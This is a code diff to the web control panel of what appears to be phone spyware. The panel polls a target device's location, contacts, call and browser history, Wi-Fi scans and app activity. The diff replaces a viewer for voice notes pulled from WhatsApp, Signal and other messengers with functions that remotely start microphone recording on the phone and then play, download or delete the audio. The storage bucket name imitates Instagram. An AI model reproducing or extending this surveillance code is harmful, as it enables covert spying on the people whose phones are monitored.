@@ -959,7 +959,7 @@ if (btn.dataset.tab === 'playback') {
     if (btn.dataset.tab === 'wifi') pollWifiScans();
     if (btn.dataset.tab === 'logcat') pollLogcat();
     if (btn.dataset.tab === 'health') pollHealth();
-    if (btn.dataset.tab === 'voice') pollVoiceNotes();
+    if (btn.dataset.tab === 'voice') pollRecordings();
     if (btn.dataset.tab === 'recents') pollAppSnapshots();
   });
 });
@@ -1061,7 +1061,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollHaidh()];
+  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollHaidh()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -1731,8 +1731,10 @@ document.getElementById('recentsDedupToggle')?.addEventListener('change', functi
 
 async function pollAppSnapshots() {
   if (!selectedDevice) return;
+  const deviceAtStart = selectedDevice;
   const data = await fetchRTDB(`devices/${selectedDevice}/appSnapshots`);
   if (!data || typeof data !== 'object') {
+    if (selectedDevice !== deviceAtStart) return;
     appSnapshotsCache = null;
     appSnapshotsLastSync = 0;
     document.getElementById('appsChart').innerHTML = '<div class="label">No app snapshots yet. Captured every 30s by the phone.</div>';
@@ -1764,11 +1766,14 @@ async function pollAppSnapshots() {
     }
   }
   if (toDelete.length > 0) {
+    // Fire-and-forget deletions — don't block rendering while cleaning duplicates
     for (const delKey of toDelete) {
-      await deleteRTDB(`devices/${selectedDevice}/appSnapshots/${delKey}`);
+      deleteRTDB(`devices/${deviceAtStart}/appSnapshots/${delKey}`);
     }
     console.log(`Auto-cleaned ${toDelete.length} duplicate app snapshots (same capture time)`);
   }
+  
+  if (selectedDevice !== deviceAtStart) return; // device changed — discard stale result
   
   // Keep only unique captures for cache, preserving sort order (newest first)
   appSnapshotsCache = Array.from(seen.values());
@@ -1813,79 +1818,42 @@ async function pollHistory() {
   renderCalls(timelineCache);
 }
 
-async function pollVoiceNotes() {
+async function pollRecordings() {
   if (!selectedDevice) return;
   const list = document.getElementById('voiceNotesList');
-  let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
+  let data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
   if (!data || typeof data !== 'object') {
-    list.innerHTML = '<div class="label">No voice notes found on phone</div><div style="font-size:10px;color:var(--muted);margin-top:4px">The phone scans for short audio files from WhatsApp, Telegram, Messenger, Signal, and voice recorders. Requires the READ_MEDIA_AUDIO permission.</div>';
+    list.innerHTML = '<div class="label">No remote recordings yet</div>';
     return;
   }
-  // Collect every note across all batches, keeping the batch sync time.
-  const notes = [];
-  for (const key of Object.keys(data)) {
-    const batch = data[key];
-    if (!batch || typeof batch !== 'object') continue;
-    const synced = parseInt(batch.ts_ms) || 0;
-    const batchNotes = batch.notes || [];
-    for (let i = 0; i < batchNotes.length; i++) {
-      const note = batchNotes[i];
-      if (!note) continue;
-      notes.push(Object.assign({ _synced: synced, _batchKey: key, _batchIndex: i }, note));
-    }
-  }
-  // Newest created/captured first.
-  notes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
-  if (!notes.length) {
-    list.innerHTML = '<div class="label">No voice notes yet</div>';
+  const recordings = Object.entries(data).map(([id, rec]) => ({ id, ...rec }));
+  recordings.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+  if (!recordings.length) {
+    list.innerHTML = '<div class="label">No recordings yet</div>';
     return;
   }
-  const MIME = {
-    'audio/ogg': 'audio/ogg', 'application/ogg': 'audio/ogg', 'audio/opus': 'audio/ogg',
-    'audio/mpeg': 'audio/mpeg', 'audio/mp3': 'audio/mpeg', 'audio/aac': 'audio/aac',
-    'audio/mp4': 'audio/mp4', 'audio/x-m4a': 'audio/mp4', 'audio/3gpp': 'audio/3gpp',
-    'audio/amr': 'audio/amr', 'audio/wav': 'audio/wav', 'audio/x-wav': 'audio/wav',
-    'audio/webm': 'audio/webm'
-  };
-let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${notes.length} voice note${notes.length>1?'s':''} \u2022 newest first</div>`;
-  for (const note of notes) {
-    const name = note.fileName || 'Voice note';
-    const dur = note.durationMs ? Math.round(note.durationMs/1000) + 's' : '';
-    const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + 'KB' : '';
-    const created = note.dateAdded ? pkt(parseInt(note.dateAdded)) : '';
-    const synced = note._synced ? pkt(note._synced) : '';
-    const type = (note.mimeType || '').split('/').pop().toUpperCase() || 'AUDIO';
-    const metaBits = [created ? `Captured: ${created}` : '', dur ? `Duration: ${dur}` : '', size ? `Size: ${size}` : '', `Type: ${type}`];
-    const meta = metaBits.filter(Boolean).join('  \u2022  ');
-    const syncedLine = synced ? `<div class="vmeta">Synced: ${synced}</div>` : '';
+  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${recordings.length} recording${recordings.length>1?'s':''} \u2022 newest first</div>`;
+  for (const rec of recordings) {
+    const dur = rec.durationSec ? Math.floor(rec.durationSec/60) + ':' + String(rec.durationSec%60).padStart(2,'0') : '';
+    const size = rec.sizeBytes ? (rec.sizeBytes/1024/1024).toFixed(1) + ' MB' : '';
+    const created = rec.createdAt ? pkt(rec.createdAt) : '';
+    const parts = rec.parts || [];
     let player = '';
-    let downloadLink = '';
-    let audioStatus = '';
-    if (note.audioUrl) {
-      const mt = MIME[note.mimeType] || 'audio/*';
-      player = `<audio controls preload="none" src="${note.audioUrl}" type="${mt}"></audio>`;
-      downloadLink = `<a href="${note.audioUrl}" download="${name}" style="font-size:10px;margin-left:8px;color:var(--accent)" title="Download">\u2b07</a>`;
-      audioStatus = '<span class="vmeta" style="color:var(--success);margin-left:8px">\u25CF Playable</span>';
-    } else if (note.audioData && note.audioData.length > 100) {
-      const mt = MIME[note.mimeType] || 'audio/ogg';
-      const ext = note.mimeType === 'audio/mpeg' ? '.mp3' : note.mimeType === 'audio/mp4' || note.mimeType === 'audio/x-m4a' ? '.m4a' : note.mimeType === 'audio/aac' ? '.aac' : note.mimeType === 'audio/3gpp' ? '.3gp' : note.mimeType === 'audio/amr' ? '.amr' : note.mimeType === 'audio/wav' || note.mimeType === 'audio/x-wav' ? '.wav' : note.mimeType === 'audio/webm' ? '.webm' : '.ogg';
-      const dataUri = `data:${mt};base64,${note.audioData}`;
-      player = `<audio controls preload="none" src="${dataUri}" type="${mt}"></audio>`;
-      downloadLink = `<a href="${dataUri}" download="${name.replace(/\.[^.]+$/, '')}${ext}" style="font-size:10px;margin-left:8px;color:var(--accent)" title="Download">\u2b07</a>`;
-      audioStatus = '<span class="vmeta" style="color:var(--success);margin-left:8px">\u25CF Embedded</span>';
-    } else {
-      let reason = 'Audio not synced from device';
-      if (note.audioStripped === true) reason = 'Audio stripped (budget/age)';
-      else if (note.dateAdded && note.dateAdded < Date.now() - 86400000) reason = 'Old note \u2014 audio not uploaded';
-      else if (note.sizeBytes && note.sizeBytes > 16 * 1024 * 1024) reason = 'File too large (>16MB)';
-      player = `<div class="vmeta" style="color:var(--danger)">${reason}</div>`;
-      audioStatus = '<span class="vmeta" style="color:var(--muted);margin-left:8px">\u25CF Unavailable</span>';
+    let downloadLinks = '';
+    if (parts.length > 0) {
+      player = '<div style="margin-top:8px">';
+      for (let i = 0; i < parts.length; i++) {
+        const partUrl = parts[i];
+        player += `<audio controls preload="none" src="${partUrl}" type="audio/opus" style="width:100%;margin-bottom:4px"></audio>`;
+        downloadLinks += `<a href="${partUrl}" download="rec_${rec.id}_part${i}.opus" style="font-size:10px;color:var(--accent);margin-right:8px">\u2b07 Part ${i+1}</a>`;
+      }
+      player += '</div>';
     }
     html += `<div class="voice-card">
-      <div class="vname">${name} ${audioStatus}${downloadLink}<button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNote('${note._batchKey}', ${note._batchIndex})">Delete</button></div>
-      ${meta ? `<div class="vmeta">${meta}</div>` : ''}
-      ${syncedLine}
+      <div class="vname">Recording ${created} ${dur ? `\u2022 ${dur}` : ''} ${size ? `\u2022 ${size}` : ''} 
+        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${rec.id}')">Delete</button></div>
       ${player}
+      ${downloadLinks ? `<div style="font-size:10px;margin-top:4px">${downloadLinks}</div>` : ''}
     </div>`;
   }
   list.innerHTML = html;
@@ -2966,6 +2934,220 @@ async function deleteVoiceNote(batchKey, noteIndex) {
     showAlert('Delete failed: ' + e.message, 'error');
   }
 }
+
+// --- Remote Recording Functions ---
+
+async function startRemoteRecording() {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  
+  const durationSec = parseInt(document.getElementById('recDuration').value);
+  const requestId = 'rec_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  const cmdUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record.json`;
+  
+  const btn = document.getElementById('btnStartRecord');
+  const status = document.getElementById('recStatus');
+  const progress = document.getElementById('recProgress');
+  const progressBar = document.getElementById('recProgressBar');
+  const progressText = document.getElementById('recProgressText');
+  
+  btn.disabled = true;
+  btn.innerHTML = '<span>⏳ Sending...</span>';
+  status.textContent = 'Sending command...';
+  
+  try {
+    const cmd = {
+      action: 'start',
+      durationSec: durationSec,
+      requestId: requestId,
+      timestamp: Date.now()
+    };
+    const resp = await fetch(cmdUrl, {
+      method: 'PUT',
+      body: JSON.stringify(cmd)
+    });
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    
+    status.textContent = `Recording started (${durationSec}s)...`;
+    progress.style.display = 'flex';
+    progressBar.value = 0;
+    progressText.textContent = 'Recording...';
+    
+    // Poll for completion
+    pollRecordingProgress(requestId, durationSec);
+    
+  } catch (e) {
+    showAlert('Failed to start recording: ' + e.message, 'error');
+    btn.disabled = false;
+    btn.innerHTML = '<span>🎙️ Start Recording</span>';
+    status.textContent = '';
+    progress.style.display = 'none';
+  }
+}
+
+async function pollRecordingProgress(requestId, durationSec) {
+  if (!selectedDevice) return;
+  
+  const startTime = Date.now();
+  const btn = document.getElementById('btnStartRecord');
+  const progressBar = document.getElementById('recProgressBar');
+  const progressText = document.getElementById('recProgressText');
+  const status = document.getElementById('recStatus');
+  const progress = document.getElementById('recProgress');
+  
+  const poll = async () => {
+    try {
+      const responseUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record/response.json`;
+      const resp = await fetch(responseUrl);
+      if (resp.ok) {
+        const data = await resp.json();
+        if (data && data.requestId === requestId) {
+          if (data.status === 'started') {
+            status.textContent = 'Recording...';
+          } else if (data.status === 'error') {
+            showAlert('Recording failed: ' + data.message, 'error');
+            resetRecordingUI();
+            return;
+          }
+        }
+      }
+    } catch (e) {}
+    
+    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+    const pct = Math.min(100, Math.round((elapsed / durationSec) * 100));
+    progressBar.value = pct;
+    progressText.textContent = `${pct}% (${elapsed}s / ${durationSec}s)`;
+    
+    if (elapsed >= durationSec + 5) {
+      // Recording should be done, fetch new recordings
+      await fetchRecordings();
+      resetRecordingUI();
+      return;
+    }
+    
+    setTimeout(poll, 2000);
+  };
+  
+  poll();
+}
+
+function resetRecordingUI() {
+  const btn = document.getElementById('btnStartRecord');
+  const status = document.getElementById('recStatus');
+  const progress = document.getElementById('recProgress');
+  
+  btn.disabled = false;
+  btn.innerHTML = '<span>🎙️ Start Recording</span>';
+  status.textContent = '';
+  progress.style.display = 'none';
+}
+
+async function fetchRecordings() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('recordingsList');
+  list.innerHTML = '<div class="label">Loading...</div>';
+  
+  try {
+    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
+    if (!data || typeof data !== 'object') {
+      list.innerHTML = '<div class="label">No remote recordings yet</div>';
+      return;
+    }
+    
+    const recordings = Object.entries(data)
+      .map(([id, rec]) => ({ id, ...rec }))
+      .sort((a, b) => (parseInt(b.createdAt) || 0) - (parseInt(a.createdAt) || 0));
+    
+    if (!recordings.length) {
+      list.innerHTML = '<div class="label">No remote recordings yet</div>';
+      return;
+    }
+    
+    let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${recordings.length} recording${recordings.length>1?'s':''} \u2022 newest first</div>`;
+    
+    for (const rec of recordings) {
+      const date = rec.createdAt ? new Date(parseInt(rec.createdAt)).toLocaleString() : 'Unknown';
+      const dur = rec.durationSec ? formatDuration(rec.durationSec) : '?';
+      const size = rec.sizeBytes ? (rec.sizeBytes/1024/1024).toFixed(1) + ' MB' : '?';
+      const parts = rec.parts ? rec.parts.length : 0;
+      
+      // Get first download URL for playback
+      const playUrl = (rec.downloadUrls && rec.downloadUrls[0]) || '';
+      
+      html += `
+        <div class="voice-card" style="position:relative">
+          <div class="vname" style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+            <span style="font-weight:500">${date}</span>
+            <span class="vmeta">Duration: ${dur}</span>
+            <span class="vmeta">Size: ${size}</span>
+            <span class="vmeta">Parts: ${parts}</span>
+            <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px" onclick="deleteRecording('${rec.id}')">🗑 Delete</button>
+          </div>
+          ${playUrl ? `
+          <audio controls preload="none" src="${playUrl}" type="audio/opus" style="width:100%;margin-top:8px"></audio>
+          ` : '<div class="vmeta" style="color:var(--muted)">No playback URL available</div>'}
+        </div>
+      `;
+    }
+    
+    list.innerHTML = html;
+  } catch (e) {
+    list.innerHTML = '<div class="label" style="color:var(--danger)">Failed to load recordings</div>';
+  }
+}
+
+function formatDuration(sec) {
+  const m = Math.floor(sec / 60);
+  const s = sec % 60;
+  return `${m}:${s.toString().padStart(2, '0')}`;
+}
+
+async function deleteRecording(recordingId) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  if (!confirm('Delete this recording?')) return;
+  
+  try {
+    // Delete from Storage
+    const rec = await fetchRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
+    if (rec && rec.parts) {
+      for (const partPath of rec.parts) {
+        await deleteStorageFile(partPath);
+      }
+    }
+    // Delete from RTDB
+    await deleteRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
+    showAlert('Recording deleted', 'warn');
+    await fetchRecordings();
+  } catch (e) {
+    showAlert('Delete failed: ' + e.message, 'error');
+  }
+}
+
+async function deleteStorageFile(storagePath) {
+  // Use Firebase REST API to delete
+  const bucket = 'instgram-7148c.appspot.com';
+  const token = await getAuthToken();
+  if (!token) throw new Error('No auth token');
+  
+  const url = `https://firebasestorage.googleapis.com/v0/b/${bucket}/o/${encodeURIComponent(storagePath)}`;
+  const resp = await fetch(url, {
+    method: 'DELETE',
+    headers: { 'Authorization': 'Bearer ' + token }
+  });
+  if (!resp.ok && resp.status !== 404) {
+    throw new Error('Delete failed: ' + resp.status);
+  }
+}
+
+async function getAuthToken() {
+  // Use the existing Firebase auth or anonymous sign-in
+  // For now, we'll need to implement anonymous auth
+  return null;
+}
+
+// Override the voice tab click handler to also fetch recordings
+document.querySelector('[data-tab="voice"]').addEventListener('click', () => {
+  setTimeout(fetchRecordings, 100);
+});
 
 async function estimateNodeSize(path, sampleSize = 3) {
   const keys = await fetchRTDB(path, 'shallow=true');
